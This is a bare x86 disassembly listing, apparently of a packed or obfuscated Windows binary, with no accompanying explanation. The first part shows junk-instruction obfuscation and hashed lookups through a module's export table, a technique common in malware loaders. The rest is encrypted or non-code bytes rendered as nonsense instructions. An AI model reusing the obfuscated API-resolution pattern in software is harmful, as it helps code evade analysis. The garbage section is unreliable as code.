  4060a7:	mov    ecx,DWORD PTR [ebp-0x18]
  4060aa:	and    DWORD PTR ds:0x42b01c,0x0
  4060b4:	mov    edi,DWORD PTR ds:0x42b01c
  4060ba:	inc    edi
  4060bb:	mov    DWORD PTR ds:0x42b01c,edi
  4060c1:	cmp    DWORD PTR ds:0x42b01c,0x23
  4060c8:	jne    0x4060da
  4060ce:	push   DWORD PTR [ebp-0x14]
  4060d1:	push   DWORD PTR [ebp-0x28]
  4060d4:	call   DWORD PTR ds:0x424020
  4060da:	cmp    DWORD PTR ds:0x42b01c,0x19
  4060e1:	jb     0x4060b4
  4060e7:	xor    eax,ebx
  4060e9:	add    DWORD PTR ds:0x429018,0x397c
  4060f3:	mov    edi,0x3272db
  4060f8:	sub    DWORD PTR ds:0x428020,0x386b
  406102:	add    eax,edi
  406104:	mov    DWORD PTR ds:0x42900c,0x67dc
  40610e:	cmp    ecx,eax
  406110:	mov    DWORD PTR ds:0x42c00c,0x661b
  40611a:	je     0x406313
  406120:	push   DWORD PTR [ebp-0x18]
  406123:	sub    DWORD PTR ds:0x42800c,0x42a014
  40612d:	push   DWORD PTR [ebp+0x8]
  406130:	and    DWORD PTR ds:0x42b000,0x429010
  40613a:	call   0x41b72b
  40613f:	sub    ecx,DWORD PTR ds:0x42a00c
  406145:	mov    DWORD PTR [ebp-0x18],eax
  406148:	xor    eax,eax
  40614a:	xor    eax,DWORD PTR ds:0x42a01c
  406150:	xor    DWORD PTR ds:0x428018,eax
  406156:	mov    eax,DWORD PTR [ebp-0x4]
  406159:	mov    ecx,DWORD PTR [ebp-0x18]
  40615c:	xor    eax,ebx
  40615e:	add    eax,edi
  406160:	cmp    ecx,eax
  406162:	je     0x406313
  406168:	mov    ecx,DWORD PTR ds:0x429010
  40616e:	add    DWORD PTR ds:0x42a010,ecx
  406174:	mov    eax,DWORD PTR [ebp-0x18]
  406177:	and    DWORD PTR ds:0x42a008,0x0
  406181:	jmp    0x406193
  406186:	mov    ecx,DWORD PTR ds:0x42a008
  40618c:	inc    ecx
  40618d:	mov    DWORD PTR ds:0x42a008,ecx
  406193:	cmp    DWORD PTR ds:0x42a008,0x14
  40619a:	jae    0x40621e
  4061a0:	cmp    DWORD PTR ds:0x42a008,0x1f
  4061a7:	jne    0x4061d5
  4061ad:	push   0x42b010
  4061b2:	push   DWORD PTR [ebp-0x10]
  4061b5:	push   0x4f72
  4061ba:	push   0x42900c
  4061bf:	push   DWORD PTR [ebp-0x24]
  4061c2:	push   0x423992
  4061c7:	push   DWORD PTR [ebp-0x1c]
  4061ca:	push   0x3544
  4061cf:	call   DWORD PTR ds:0x424024
  4061d5:	jmp    0x406186
  4061da:	and    DWORD PTR ds:0x428020,0x0
  4061e4:	mov    ecx,DWORD PTR ds:0x428020
  4061ea:	inc    ecx
  4061eb:	mov    DWORD PTR ds:0x428020,ecx
  4061f1:	cmp    DWORD PTR ds:0x428020,0x1a
  4061f8:	jne    0x406211
  4061fe:	push   DWORD PTR [ebp-0x1c]
  406201:	push   0x561b
  406206:	push   0x3276
  40620b:	call   DWORD PTR ds:0x424028
  406211:	cmp    DWORD PTR ds:0x428020,0x17
  406218:	jb     0x4061e4
  40621e:	mov    eax,DWORD PTR [eax+0x18]
  406221:	mov    DWORD PTR [ebp-0x24],eax
  406224:	xor    eax,eax
  406226:	mov    eax,DWORD PTR [ebp-0x18]
  406229:	mov    ecx,DWORD PTR [ebp+0x8]
  40622c:	add    DWORD PTR ds:0x42901c,0x480
  406236:	add    ecx,DWORD PTR [eax+0x20]
  406239:	mov    DWORD PTR [ebp-0x2c],ecx
  40623c:	sub    DWORD PTR ds:0x42c00c,ebx
  406242:	mov    eax,DWORD PTR [ebp-0x18]
  406245:	mov    ecx,DWORD PTR [ebp+0x8]
  406248:	add    DWORD PTR ds:0x42a004,0x42a01c
  406252:	add    ecx,DWORD PTR [eax+0x24]
  406255:	mov    DWORD PTR [ebp-0x34],ecx
  406258:	inc    ecx
  406259:	mov    eax,DWORD PTR [ebp-0x18]
  40625c:	sub    DWORD PTR ds:0x42b010,0x20b8
  406266:	mov    ecx,DWORD PTR [ebp+0x8]
  406269:	or     DWORD PTR ds:0x42a010,0x1874
  406273:	add    ecx,DWORD PTR [eax+0x1c]
  406276:	mov    eax,edi
  406278:	mov    DWORD PTR [ebp-0x18],ecx
  40627b:	jmp    0x4062db
  406280:	mov    ecx,DWORD PTR [ebp-0x2c]
  406283:	mov    edx,DWORD PTR [ebp+0x8]
  406286:	add    edx,DWORD PTR [ecx+esi*4]
  406289:	mov    DWORD PTR [ebp-0x28],edx
  40628c:	mov    ecx,DWORD PTR [ebp-0x4]
  40628f:	mov    edx,DWORD PTR [ebp-0x28]
  406292:	xor    ecx,ebx
  406294:	add    ecx,eax
  406296:	cmp    edx,ecx
  406298:	je     0x4062db
  40629e:	jmp    0x4062c7
  4062a3:	mov    ecx,DWORD PTR [ebp-0x4]
  4062a6:	mov    edx,DWORD PTR [ebp-0x8]
  4062a9:	xor    ecx,ebx
  4062ab:	add    ecx,eax
  4062ad:	cmp    edx,ecx
  4062af:	je     0x40631f
  4062b5:	mov    ecx,DWORD PTR [ebp-0x4]
  4062b8:	mov    edx,DWORD PTR [ebp-0x30]
  4062bb:	xor    ecx,ebx
  4062bd:	add    ecx,eax
  4062bf:	cmp    edx,ecx
  4062c1:	je     0x40632e
  4062c7:	lea    eax,[ebp-0x8]
  4062ca:	push   eax
  4062cb:	push   DWORD PTR [ebp-0x28]
  4062ce:	push   DWORD PTR [ebp+0xc]
  4062d1:	call   0x41c3b5
  4062d6:	mov    eax,0x3272db
  4062db:	mov    ecx,DWORD PTR [ebp-0x4]
  4062de:	mov    edx,DWORD PTR [ebp-0x8]
  4062e1:	xor    ecx,ebx
  4062e3:	add    ecx,eax
  4062e5:	cmp    edx,ecx
  4062e7:	je     0x406302
  4062ed:	mov    ecx,DWORD PTR [ebp-0x34]
  4062f0:	movzx  ecx,WORD PTR [ecx+esi*2]
  4062f4:	mov    edx,DWORD PTR [ebp-0x18]
  4062f7:	mov    ecx,DWORD PTR [edx+ecx*4]
  4062fa:	mov    DWORD PTR [ebp-0x38],ecx
  4062fd:	jmp    0x4062a3
  406302:	mov    ecx,DWORD PTR [ebp-0x14]
  406305:	xor    ecx,ebx
  406307:	lea    esi,[esi+ecx*1+0x3272db]
  40630e:	jmp    0x405fec
  406313:	mov    eax,DWORD PTR [ebp-0x4]
  406316:	xor    eax,ebx
  406318:	add    eax,edi
  40631a:	jmp    0x40cf3f
  40631f:	mov    eax,DWORD PTR [ebp-0x4]
  406322:	xor    eax,ebx
  406324:	add    eax,0x3272db
  406329:	jmp    0x40cf3f
  40632e:	mov    ecx,DWORD PTR [ebp-0x38]
  406331:	add    ecx,DWORD PTR [ebp+0x8]
  406334:	mov    DWORD PTR [ebp-0x10],ecx
  406337:	mov    ecx,DWORD PTR [ebp-0x1c]
  40633a:	test   ecx,ecx
  40633c:	je     0x40ceca
  406342:	mov    DWORD PTR [ebp-0x20],0x0
  406349:	jmp    0x4086d8
  40634e:	ins    BYTE PTR es:[edi],dx
  40634f:	pop    ebp
  406350:	(bad)  
  406351:	call   0xd5a4cae1
  406356:	xchg   esi,eax
  406357:	imul   esi,edx,0x66
  40635a:	and    eax,0x38ae5d82
  40635f:	cmp    esp,DWORD PTR [edx+0x62]
  406362:	adc    BYTE PTR [edi+0x62],bl
  406365:	bound  esp,QWORD PTR [edx+ebx*8]
  406368:	xchg   edi,eax
  406369:	jns    0x406338
  40636b:	push   ebp
  40636c:	add    eax,0xfb97f837
  406371:	fadd   QWORD PTR [ebp+ebp*8+0x79]
  406375:	mov    ds:0x17a67802,eax
  40637a:	bound  ax,DWORD PTR [edi-0x386c77f]
  406381:	fwait
  406382:	add    DWORD PTR [ebx-0x3eaa5e5a],ecx
  406388:	sbb    al,0xa3
  40638a:	(bad)  
  40638b:	hlt    
  40638c:	out    dx,al
  40638d:	popf   
  40638e:	and    BYTE PTR [eax],al
  406390:	cmp    eax,0x22c974c2
  406395:	pop    eax
  406396:	in     al,0x4a
  406398:	mov    ebx,0x2cea6974
  40639d:	mov    gs,WORD PTR [eax-0xb]
  4063a0:	add    ecx,DWORD PTR [ebx]
  4063a2:	ds pop ebx
  4063a4:	push   edx
  4063a5:	add    BYTE PTR [ebx-0x1a],bl
  4063a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4063a9:	mov    bl,0x74
  4063ab:	fcomp  st(2)
  4063ad:	cmc    
  4063ae:	sub    ah,BYTE PTR [eax]
  4063b0:	mul    edx
  4063b2:	in     al,dx
  4063b3:	loopne 0x40641a
  4063b5:	call   0x2dfc:0xa325df17
  4063bc:	outs   dx,DWORD PTR ds:[esi]
  4063bd:	into   
  4063be:	scas   al,BYTE PTR es:[edi]
  4063bf:	stos   BYTE PTR es:[edi],al
  4063c0:	mov    bh,0x91
  4063c2:	push   eax
  4063c3:	ds dec ebx
  4063c5:	mov    esi,0x1677296c
  4063ca:	loope  0x4063d1
  4063cc:	aad    0x1d
  4063ce:	inc    ebx
  4063cf:	and    al,0x94
  4063d1:	pop    esp
  4063d2:	sub    edi,esi
  4063d4:	ret    
  4063d5:	in     al,dx
  4063d6:	std    
  4063d7:	imul   eax,ebp,0xd9b92707
  4063dd:	add    eax,0x96a5092
  4063e2:	jecxz  0x4063eb
  4063e4:	sub    cl,BYTE PTR [ecx]
  4063e6:	cwde   
  4063e7:	imul   esp,DWORD PTR [esi+edx*1-0x2a],0x7f
  4063ec:	mov    ecx,0x2980d7fc
  4063f1:	sti    
  4063f2:	or     edi,esi
  4063f4:	lods   eax,DWORD PTR ds:[esi]
  4063f5:	mov    edx,0xcebc681f
  4063fa:	lea    ebp,[esi]
  4063fc:	mov    ebp,0x4ff45ccc
  406401:	xchg   edx,eax
  406402:	sub    al,BYTE PTR [edi]
  406404:	femms  
  406406:	fdiv   QWORD PTR [esp+eiz*2+0x22ce9b8a]
  40640d:	in     al,0x46
  40640f:	test   BYTE PTR [ecx],ch
  406411:	xor    eax,0x2d2f736c
  406416:	ror    BYTE PTR [esp+ebx*1-0x7],0x65
  40641b:	mov    dh,0xc2
  40641d:	sub    al,0x30
  40641f:	rol    BYTE PTR [edi],1
  406421:	fnstenv [ecx+ebx*2-0x4bad50e3]
  406428:	aad    0xc2
  40642a:	fldenv [edx]
  40642c:	imul   edx,edx,0x75
  40642f:	inc    ebx
  406430:	adc    edx,eax
  406432:	jb     0x406447
  406434:	jle    0x406498
  406436:	ficomp WORD PTR [ebx+0x3a]
  406439:	idiv   DWORD PTR [esi+0x1a]
  40643c:	lahf   
  40643d:	and    bh,BYTE PTR [ecx]
  40643f:	repz push ds
  406441:	push   0xfffffff6
  406443:	jnp    0x4063ca
  406445:	sti    
  406446:	sub    eax,0xd1da89a7
  40644b:	iret   
  40644c:	mov    ecx,gs
  40644e:	popa   
  40644f:	int3   
  406450:	lods   al,BYTE PTR ds:[esi]
  406451:	imul   ecx,esi,0xffffffd2
  406454:	test   DWORD PTR [ecx-0x42625009],ecx
  40645a:	sub    eax,0xfdc63645
  40645f:	out    0x1f,al
  406461:	xchg   edi,eax
  406462:	adc    al,0xa8
  406464:	clc    
  406465:	rol    BYTE PTR [esi-0x47],0x16
  406469:	xor    DWORD PTR [ebp+0x1b],ebp
  40646c:	mov    edi,0xfc96d90b
  406471:	ins    BYTE PTR es:[edi],dx
  406472:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406473:	pop    edi
  406474:	lahf   
  406475:	mov    edx,0xdc3b90e3
  40647a:	mov    ebx,0xa6e96e92
  40647f:	or     ebp,DWORD PTR [edx+0x73185edc]
  406485:	add    BYTE PTR [edi+0x4496a1a5],bl
  40648b:	xor    DWORD PTR [ebx],0xffffffa0
  40648e:	popa   
  40648f:	jns    0x4064b8
  406491:	outs   dx,BYTE PTR ds:[esi]
  406492:	ss push esi
  406494:	add    edi,eax
  406496:	push   es
  406497:	cmp    edi,DWORD PTR [edx]
  406499:	clc    
  40649a:	dec    esi
  40649b:	addr16 xchg edi,eax
  40649d:	mov    DWORD PTR [ecx+edx*2-0x4],esp
  4064a1:	jl     0x406512
  4064a3:	popf   
  4064a4:	push   esi
  4064a5:	hlt    
  4064a6:	enter  0xa1cb,0x72
  4064aa:	pop    eax
  4064ab:	cdq    
  4064ac:	add    al,0x93
  4064ae:	pop    ecx
  4064af:	cmp    bl,BYTE PTR [esi+0x15ad62ed]
  4064b5:	or     al,0xed
  4064b7:	cmp    BYTE PTR [ebp-0x1dc50f1a],dl
  4064bd:	sti    
  4064be:	popa   
  4064bf:	xor    BYTE PTR [ebx+0x42],dl
  4064c2:	shl    bh,1
  4064c4:	inc    esi
  4064c5:	or     dh,BYTE PTR [eax]
  4064c7:	or     ah,BYTE PTR [ebp+0x2e]
  4064ca:	mov    al,ds:0x8be38e0b
  4064cf:	pop    ds
  4064d0:	cld    
  4064d1:	ds cmp al,0xec
  4064d4:	ficom  DWORD PTR [edi-0x264d2d8e]
  4064da:	mov    eax,0x41d3d27e
  4064df:	mov    dh,0xaa
  4064e1:	ds and eax,0x51f3b8d4
  4064e7:	pop    ss
  4064e8:	mov    ebx,ebp
  4064ea:	cvtps2pd xmm0,QWORD PTR [edi]
  4064ed:	adc    eax,0x1fb43a9
  4064f2:	in     al,dx
  4064f3:	sti    
  4064f4:	xchg   ebp,eax
  4064f5:	and    eax,0xf98c5dbc
  4064fa:	std    
  4064fb:	shl    DWORD PTR [ebp-0x1d],0x61
  4064ff:	push   ds
  406500:	mov    BYTE PTR [edx],dh
  406502:	(bad)  
  406503:	rcr    BYTE PTR [ecx],0x2a
  406506:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406507:	fnstenv [ecx+0x3f5df1d3]
  40650d:	outs   dx,DWORD PTR ds:[esi]
  40650e:	mul    BYTE PTR [edi-0x13]
  406511:	push   ebp
  406512:	and    BYTE PTR ds:0xacff9acf,al
  406518:	push   ss
  406519:	in     eax,0xd6
  40651b:	mov    eax,DWORD PTR gs:[ebx-0x2298e4a4]
  406522:	sbb    bh,BYTE PTR [edi-0x2a128110]
  406528:	jecxz  0x4065a6
  40652a:	sub    bl,BYTE PTR [esi-0x7544f719]
  406530:	cmp    esp,DWORD PTR [ebx]
  406532:	fldenv [ecx+esi*4-0x76]
  406536:	iret   
  406537:	sub    edi,DWORD PTR [eax]
  406539:	popa   
  40653a:	out    0xf7,eax
  40653c:	mov    al,ds:0x31dc6601
  406541:	fild   QWORD PTR [edi+0x6]
  406544:	sub    BYTE PTR [edx+esi*8-0x30984406],al
  40654b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40654c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40654d:	ret    0xa8b6
  406550:	jne    0x4064db
  406552:	push   0xdf196b72
  406557:	inc    esp
  406558:	mov    dl,0x46
  40655a:	mov    al,ds:0xeac04d86
  40655f:	mov    dl,0xf7
  406561:	dec    DWORD PTR [edi+0x6f5d23b6]
  406567:	lods   eax,DWORD PTR ds:[esi]
  406568:	clc    
  406569:	push   ds
  40656a:	mov    dh,0x20
  40656c:	jmp    0x2850caef
  406571:	in     eax,dx
  406572:	pop    esi
  406573:	stos   DWORD PTR es:[edi],eax
  406574:	sub    ebx,0x6f5f2c41
  40657a:	out    dx,al
  40657b:	mov    edx,0xb6b38839
  406580:	arpl   WORD PTR [edi+0x53],sp
  406583:	sub    eax,0xa05ba8c3
  406588:	xor    DWORD PTR [edi+0x407982a8],edi
  40658e:	clc    
  40658f:	and    eax,0xcdb5af65
  406594:	adc    al,0xb9
  406596:	icebp  
  406597:	sbb    eax,0xc3a343af
  40659c:	mov    al,BYTE PTR [ebp+0x6b3ab8db]
  4065a2:	and    DWORD PTR ds:0x244a7466,eax
  4065a8:	lods   al,BYTE PTR ds:[esi]
  4065a9:	das    
  4065aa:	or     ah,BYTE PTR [edi+0x14712ba9]
  4065b0:	dec    edi
  4065b1:	cli    
  4065b2:	adc    DWORD PTR [esi-0xa177fd8],0xe39bf269
  4065bc:	cmp    eax,0x3b50e497
  4065c1:	jbe    0x406570
  4065c3:	shl    BYTE PTR [esi],0xc6
  4065c6:	iret   
  4065c7:	mov    bl,0x9a
  4065c9:	test   eax,0x62cd2440
  4065ce:	rol    DWORD PTR [ecx+0x55fbc213],1
  4065d4:	and    ebp,DWORD PTR [esp+eiz*8-0x5ad61056]
  4065db:	xor    esi,DWORD PTR [ecx]
  4065dd:	bound  edi,QWORD PTR ds:0xbef0b969
  4065e3:	pop    eax
  4065e4:	jne    0x406591
  4065e6:	in     eax,0x9a
  4065e8:	sahf   
  4065e9:	retf   0xcfbe
  4065ec:	dec    ebp
  4065ed:	cdq    
  4065ee:	jo     0x406579
  4065f0:	addr16 sahf 
  4065f2:	hlt    
  4065f3:	popf   
  4065f4:	shl    DWORD PTR [ebp-0x4eabc631],0x13
  4065fb:	out    0x2c,al
  4065fd:	cmp    al,BYTE PTR [edx+0x48]
  406600:	xlat   BYTE PTR ds:[ebx]
  406601:	jmp    0x3d00:0x51d753a5
  406608:	and    al,0x5b
  40660a:	(bad)  
  40660c:	push   ebp
  40660d:	es je  0x4065be
  406610:	in     al,0xf
  406612:	fild   QWORD PTR [ebp+0x75]
  406615:	imul   ebp,DWORD PTR [edi+0x3c35f7c8],0x198fc202
  40661f:	add    eax,0xba098a42
  406624:	mov    DWORD PTR [edx+0x69],eax
  406627:	js     0x4065b7
  406629:	jno    0x406624
  40662b:	cmp    al,0x36
  40662d:	inc    edi
  40662e:	pop    ecx
  40662f:	pop    ebx
  406630:	sbb    BYTE PTR [edi+0x5bc7b4a4],ah
  406636:	rcr    DWORD PTR [ebp+0x4260259d],1
  40663c:	shl    ah,cl
  40663e:	test   ecx,edx
  406640:	xor    ah,dl
  406642:	cld    
  406643:	jns    0x40661d
  406645:	in     eax,0x84
  406647:	push   es
  406648:	into   
  406649:	sub    dl,BYTE PTR [eax+esi*4]
  40664c:	mov    ebp,0x73635a8e
  406651:	mov    bh,0xa9
  406653:	or     eax,0xda74a5c3
  406658:	and    eax,0xf6e895a6
  40665d:	mov    ebp,0xb609ab1c
  406662:	mov    edi,edx
  406664:	cs pop esi
  406666:	dec    ecx
  406667:	pop    es
  406668:	(bad)  
  406669:	outs   dx,BYTE PTR ds:[esi]
  40666a:	dec    edi
  40666b:	push   es
  40666c:	pop    ecx
  40666d:	loope  0x4065f2
  40666f:	xor    al,0x33
  406671:	jp     0x40664a
  406673:	or     eax,0xe7a49d51
  406678:	scas   eax,DWORD PTR es:[edi]
  406679:	pop    eax
  40667a:	add    cl,ah
  40667c:	test   DWORD PTR [esi-0x6aa25a16],ebp
  406682:	sub    esi,esi
  406684:	adc    bh,BYTE PTR [ebx+0x6ca663d4]
  40668a:	pushf  
  40668b:	gs adc eax,0xb2476deb
  406691:	repnz cmp al,0x53
  406694:	in     eax,0x59
  406696:	scas   eax,DWORD PTR es:[edi]
  406697:	lock dec esp
  406699:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  40669b:	sar    BYTE PTR [edx+0x5f],cl
  40669e:	fsub   QWORD PTR [ecx-0x28]
  4066a1:	test   al,0x3c
  4066a3:	(bad)  
  4066a4:	mov    bh,0x1
  4066a6:	test   DWORD PTR [edi],esi
  4066a8:	inc    ebx
  4066a9:	aad    0x82
  4066ab:	mov    ds:0xc13b503,eax
  4066b0:	shr    BYTE PTR [ebp-0x47226b6],cl
  4066b6:	fwait
  4066b7:	push   esi
  4066b8:	pop    edx
  4066b9:	std    
  4066ba:	inc    ecx
  4066bb:	es push cs
  4066bd:	xchg   edx,eax
  4066be:	pusha  
  4066bf:	xchg   edx,eax
  4066c0:	ja     0x406674
  4066c2:	out    dx,eax
  4066c3:	daa    
  4066c4:	pop    esp
  4066c5:	aas    
  4066c6:	mov    ds:0x115ea476,al
  4066cb:	retf   
  4066cc:	in     al,0x1e
  4066ce:	sahf   
  4066cf:	or     eax,0xbded4e05
  4066d4:	xchg   ecx,eax
  4066d5:	pop    edx
  4066d6:	cdq    
  4066d7:	(bad)  
  4066d8:	inc    DWORD PTR [ecx+ebp*1]
  4066db:	and    al,0xc3
  4066dd:	mov    esp,DWORD PTR [ebx+0x30]
  4066e0:	lods   eax,DWORD PTR ds:[esi]
  4066e1:	sbb    esp,edi
  4066e3:	out    0x8c,al
  4066e5:	mov    ch,BYTE PTR [ecx+0x66fa05d7]
  4066eb:	imul   ebx,DWORD PTR [ebx-0x3cc37c7],0x7b
  4066f2:	mov    ebx,0x9c976eeb
  4066f7:	xor    al,0x82
  4066f9:	jp     0x4066f6
  4066fb:	cmp    eax,0xc33cdd79
  406700:	jge    0xce4df7ed
  406706:	sub    eax,0x941a2cfe
  40670b:	cmp    eax,0xc80a8d5
  406710:	out    dx,al
  406711:	pop    ss
  406712:	imul   eax,DWORD PTR [ebx+0x41],0xffffff8b
  406716:	stos   DWORD PTR es:[edi],eax
  406717:	mov    ebp,0x9681315d
  40671c:	inc    edx
  40671d:	inc    edx
  40671e:	int    0x68
  406720:	pop    ss
  406721:	ins    DWORD PTR es:[edi],dx
  406722:	test   BYTE PTR [ebx-0x38a5979f],dh
  406728:	push   ss
  406729:	loop   0x4066da
  40672b:	(bad)
  40672f:	lock fcmove st,st(1)
  406732:	fs or  dh,dl
  406735:	xchg   esp,eax
  406736:	mov    esi,0xc5de2990
  40673b:	pop    edx
  40673c:	mov    bh,0xb3
  40673e:	push   ebp
  40673f:	ins    DWORD PTR es:[edi],dx
  406740:	(bad)  
  406741:	clc    
  406742:	sub    cl,BYTE PTR [ebx-0x61]
  406745:	xchg   ebx,eax
  406746:	adc    esi,DWORD PTR [ebp-0x74]
  406749:	push   edi
  40674a:	jb     0x406789
  40674c:	mov    bl,0x17
  40674e:	pop    es
  40674f:	iret   
  406750:	mov    ebp,0x74d804e
  406755:	sbb    al,0xbc
  406757:	ret    0xaebd
  40675a:	and    eax,0x7840f228
  40675f:	arpl   WORD PTR [edx+0x69],si
  406762:	jbe    0x4067d9
  406764:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406765:	jl     0x4067de
  406767:	adc    DWORD PTR [eax-0x32],ebx
  40676a:	dec    edi
  40676b:	lods   al,BYTE PTR ds:[esi]
  40676c:	xlat   BYTE PTR ds:[ebx]
  40676d:	pop    eax
  40676e:	push   ebx
  40676f:	(bad)  
  406770:	dec    ebp
  406771:	ins    DWORD PTR es:[edi],dx
  406772:	mov    ah,0x61
  406774:	cmp    eax,0x4a8f9a28
  406779:	loope  0x406728
  40677b:	pop    ss
  40677c:	repnz pop ss
  40677e:	and    BYTE PTR [ecx-0x5a2399f8],0xa6
  406785:	cmc    
  406786:	and    al,0xd1
  406788:	icebp  
  406789:	cwde   
  40678a:	cmp    al,0x4
  40678c:	xor    al,0xcd
  40678e:	xor    al,0x3d
  406790:	or     ebp,ebp
  406792:	jge    0x406798
  406794:	or     eax,0xc4979990
  406799:	out    0xcf,al
  40679b:	rcr    DWORD PTR [ebx+0x75],0xae
  40679f:	mov    edx,0xf82835de
  4067a4:	mov    dh,0x33
  4067a6:	stc    
  4067a7:	sbb    ch,dl
  4067a9:	(bad)  
  4067aa:	rol    BYTE PTR [ecx],cl
  4067ac:	pop    es
  4067ad:	hlt    
  4067ae:	jmp    0xf86c:0x678eab04
  4067b5:	pop    ebp
  4067b6:	add    al,0x77
  4067b8:	cmc    
  4067b9:	jmp    0x406807
  4067bb:	scas   eax,DWORD PTR es:[edi]
  4067bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4067bd:	loopne 0x406775
  4067bf:	cmp    eax,0x8e736665
  4067c4:	mov    al,0xb3
  4067c6:	adc    ah,BYTE PTR [eax-0x475844d9]
  4067cc:	into   
  4067cd:	shl    DWORD PTR [ebp+0x11d65aa6],1
  4067d3:	sahf   
  4067d4:	xlat   BYTE PTR ds:[ebx]
  4067d5:	sub    al,BYTE PTR [eax+ebx*1-0x46]
  4067d9:	daa    
  4067da:	mov    bl,0xe3
  4067dc:	cld    
  4067dd:	cmp    BYTE PTR [edx-0x1d],ah
  4067e0:	shr    BYTE PTR [ebx-0x357fd552],1
  4067e6:	mov    ebx,0xf88eed9
  4067eb:	xchg   ebp,eax
  4067ec:	pop    edx
  4067ed:	pop    ecx
  4067ee:	sub    ah,BYTE PTR [eax+0x7ddf372b]
  4067f4:	fldlg2 
  4067f6:	push   eax
  4067f7:	sar    DWORD PTR [ebx-0x70de9e3c],cl
  4067fd:	push   ebp
  4067fe:	and    BYTE PTR [edx-0x533abc00],cl
  406804:	sbb    dl,dh
  406806:	mov    DWORD PTR cs:[ebx],edx
  406809:	mov    ebp,0xb6071f64
  40680e:	je     0x406798
  406810:	xchg   edx,eax
  406811:	inc    edi
  406812:	sbb    cl,ch
  406814:	jns    0x4067a8
  406816:	dec    ebx
  406817:	pop    edi
  406818:	inc    esi
  406819:	daa    
  40681a:	sub    eax,0x7938dbbf
  40681f:	popf   
  406820:	mov    ds:0x32725dba,al
  406825:	pop    ebp
  406826:	inc    eax
  406827:	cs repz in al,0x7a
  40682b:	cld    
  40682c:	or     ecx,ebx
  40682e:	sub    bh,dh
  406830:	dec    esp
  406831:	push   eax
  406832:	xlat   BYTE PTR ds:[ebx]
  406833:	js     0x4068ae
  406835:	inc    edi
  406836:	test   eax,0x38f96933
  40683b:	cmp    al,0xb0
  40683d:	inc    edx
  40683e:	fdivr  DWORD PTR [edx]
  406840:	mov    fs,WORD PTR [edi+0x46]
  406843:	adc    dl,BYTE PTR [eax]
  406845:	dec    edx
  406846:	ret    0x21f6
  406849:	jnp    0x4068b9
  40684b:	daa    
  40684c:	inc    esi
  40684d:	xor    DWORD PTR [ebx+0x1],esp
  406850:	pop    ds
  406851:	mov    cl,0x4f
  406853:	inc    ecx
  406854:	out    0x34,al
  406856:	ret    
  406857:	inc    edi
  406858:	gs into 
  40685a:	inc    eax
  40685b:	jl     0x406853
  40685d:	and    dh,BYTE PTR [edi]
  40685f:	scas   eax,DWORD PTR es:[edi]
  406860:	nop
  406861:	cld    
  406862:	jl     0x406881
  406864:	lods   eax,DWORD PTR ds:[esi]
  406865:	adc    al,0x42
  406867:	scas   eax,DWORD PTR es:[edi]
  406868:	iret   
  406869:	rep outs dx,BYTE PTR ds:[esi]
  40686b:	stc    
  40686c:	jmp    0x40688a
  40686e:	sbb    ebx,DWORD PTR [edx]
  406870:	cmp    ah,BYTE PTR [eax]
  406872:	sbb    al,0xcd
  406874:	scas   eax,DWORD PTR es:[edi]
  406875:	push   edx
  406876:	cdq    
  406877:	outs   dx,DWORD PTR ds:[esi]
  406878:	mov    ds,WORD PTR [ebx]
  40687a:	int    0x8b
  40687c:	jp     0x4068f9
  40687e:	adc    eax,0xf7925a4d
  406883:	push   ecx
  406884:	inc    ebp
  406885:	ret    0xee8d
  406888:	mov    dl,0x27
  40688a:	test   BYTE PTR [edi+0x57b50c7f],cl
  406890:	mov    WORD PTR [edi+eiz*2+0x72],?
  406894:	xchg   edx,eax
  406895:	inc    ecx
  406896:	jae    0x4068ac
  406898:	lds    eax,FWORD PTR [ecx*4+0x775566eb]
  40689f:	or     al,0x82
  4068a1:	inc    esi
  4068a2:	or     al,BYTE PTR [ebx-0x6d]
  4068a5:	aam    0x0
  4068a7:	mov    ebx,0x82e29bd5
  4068ac:	pop    edi
  4068ad:	popf   
  4068ae:	ss add bl,bl
  4068b1:	(bad)  
  4068b2:	mov    ds:0x731a8894,al
  4068b7:	mov    eax,0xe378629f
  4068bc:	mov    ebp,0x57ed3190
  4068c1:	mov    al,BYTE PTR [esi+0x34]
  4068c4:	int    0xaf
  4068c6:	adc    cl,BYTE PTR [edi+0x5403699e]
  4068cc:	or     eax,0x9546869c
  4068d1:	push   edi
  4068d2:	les    ebp,FWORD PTR [edi+0x4c11ddb]
  4068d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4068d9:	inc    edi
  4068da:	jecxz  0x406943
  4068dc:	sub    eax,0x38c9c8e5
  4068e1:	sub    eax,0x52f9a051
  4068e6:	rol    edi,cl
  4068e8:	hlt    
  4068e9:	add    al,0xcb
  4068eb:	inc    esp
  4068ec:	cld    
  4068ed:	inc    ecx
  4068ee:	mov    ds:0xfd5eb6f7,eax
  4068f3:	mov    dl,0x4b
  4068f5:	adc    DWORD PTR [ebx-0x29],eax
  4068f8:	xor    al,0xd4
  4068fa:	fisttp WORD PTR [esp+ecx*2]
  4068fd:	and    ecx,DWORD PTR [edx+0x4f]
  406900:	retf   0xf7e1
  406903:	sahf   
  406904:	fwait
  406905:	and    ecx,esp
  406907:	inc    edx
  406908:	clc    
  406909:	adc    al,0xb5
  40690b:	fwait
  40690c:	mov    al,ds:0x5ed642cf
  406911:	pop    ebx
  406912:	mov    al,ds:0x4afebb43
  406917:	add    al,0xb
  406919:	aas    
  40691a:	jp     0x788ef8e8
  406920:	lea    edi,[ebp-0x7860ad2e]
  406926:	and    bl,dh
  406928:	jne    0x4068cb
  40692a:	inc    edi
  40692b:	mov    BYTE PTR [ebx+0x2a],bh
  40692e:	pop    edi
  40692f:	pusha  
  406930:	add    DWORD PTR [ebx],edx
  406932:	jmp    0x40693d
  406934:	mov    ah,BYTE PTR gs:[ebp+0x62f866bc]
  40693b:	stos   DWORD PTR es:[edi],eax
  40693c:	or     eax,0x33645402
  406941:	dec    ebx
  406942:	mov    eax,ds:0xdb2394f8
  406947:	lock mov ecx,esp
  40694a:	ror    BYTE PTR [edx+0x609ca559],0x54
  406951:	into   
  406952:	rcl    cl,0x44
  406955:	jecxz  0x406976
  406957:	push   esp
  406958:	ss std 
  40695a:	daa    
  40695b:	cmc    
